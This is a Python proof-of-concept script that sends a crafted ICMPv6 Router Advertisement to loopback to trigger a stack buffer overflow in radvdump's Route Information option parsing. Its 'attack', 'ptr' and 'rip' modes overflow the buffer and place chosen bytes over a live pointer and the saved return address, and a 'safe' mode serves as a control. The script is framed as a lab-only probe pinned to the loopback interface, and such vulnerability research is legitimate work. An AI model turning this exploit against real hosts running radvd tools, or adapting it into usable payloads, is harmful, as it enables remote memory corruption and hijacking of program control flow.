#!/usr/bin/env python3
"""Send one crafted ICMPv6 Router Advertisement to ::1 on loopback.

Lab-only probe for the radvdump Route Information overflow.  Requires
CAP_NET_RAW (run under sudo).  Never sends off the local loopback interface.

Usage: send_ra.py attack|safe
  attack: option type 24, length byte 33 -> 264-byte option, 256-byte copy
  safe:   option type 24, length byte 2  ->  16-byte option,   8-byte copy
"""
import socket
import struct
import sys


def ones_complement_sum(data):
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) | data[i + 1]
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return total


def icmpv6_checksum(src, dst, payload):
    pseudo = src + dst + struct.pack("!I", len(payload)) + b"\x00\x00\x00\x3a"
    return (~ones_complement_sum(pseudo + payload)) & 0xFFFF


def build_ra(mode):
    # 16-byte nd_router_advert: type, code, cksum, curhoplimit, flags,
    # router lifetime, reachable time, retransmit timer.
    ra = bytearray(struct.pack("!BBHBBHII", 134, 0, 0, 64, 0, 0, 0, 0))

    if mode == "attack":
        length_byte = 33          # optlen = 264, copy = (33-1)*8 = 256
        prefix = bytearray([0x41] * 256)
        for off, val in ((17, 0x5A), (24, 0x7A), (33, 0x3C), (40, 0x7B), (63, 0x7E)):
            prefix[off] = val      # chosen bytes at copy offsets
    elif mode == "ptr":
        length_byte = 33
        prefix = bytearray([0x41] * 256)
        # copy offset 112 is the stack slot of the live `rinfo` pointer in
        # the -O0 real build; chosen bytes here become the pointer value.
        prefix[112:120] = bytes.fromhex("7856341278563412")
    elif mode == "rip":
        length_byte = 40          # optlen 320, copy 312; RA total 336 < MSG_SIZE_RECV 1500
        prefix = bytearray([0x41] * 312)
        # saved RIP sits 296 bytes above &addr in the real -O0 frame
        prefix[296:304] = bytes.fromhex("7856341278563412")
    elif mode == "safe":
        length_byte = 2           # optlen = 16, copy = 8, RFC 4191 conformant
        prefix = bytearray([0x41] * 8)
    else:
        raise ValueError(mode)

    # nd_opt_route_info_local: type, len, prefix_len, flags, lifetime, prefix
    option = struct.pack("!BBBBI", 24, length_byte, 0, 0, 0xFFFFFFFF) + bytes(prefix)
    assert len(option) == length_byte * 8, (len(option), length_byte * 8)
    ra.extend(option)

    src = socket.inet_pton(socket.AF_INET6, "::1")
    dst = socket.inet_pton(socket.AF_INET6, "::1")
    cksum = icmpv6_checksum(src, dst, bytes(ra))
    struct.pack_into("!H", ra, 2, cksum)
    return bytes(ra)


def main():
    if len(sys.argv) != 2:
        sys.exit("usage: send_ra.py attack|ptr|rip|safe")
    mode = sys.argv[1]
    packet = build_ra(mode)
    lo = socket.if_nametoindex("lo")
    # SOCK_RAW / IPPROTO_ICMPV6; scope id pins every hop to the lo interface.
    s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
    s.sendto(packet, ("::1", 0, 0, lo))
    s.close()
    print(f"sent {mode} RA: {len(packet)} bytes to ::1%lo (ifindex {lo})")


if __name__ == "__main__":
    main()
